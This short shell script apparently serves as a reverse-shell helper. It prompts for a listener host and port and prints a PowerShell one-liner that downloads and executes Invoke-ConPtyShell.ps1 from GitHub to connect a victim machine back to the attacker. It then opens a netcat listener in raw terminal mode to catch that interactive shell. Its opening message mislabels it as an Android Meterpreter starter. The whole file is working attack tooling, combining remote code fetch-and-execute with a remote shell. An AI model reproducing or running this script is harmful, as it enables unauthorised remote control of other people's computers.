echo "starting android meterpreter "
echo "enter local host:"
read local host
echo "enter port:"
read port
echo ""

echo "this is your powershell command:IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $local $port "
stty raw -echo; (stty size; cat) | nc -lvnp $port $local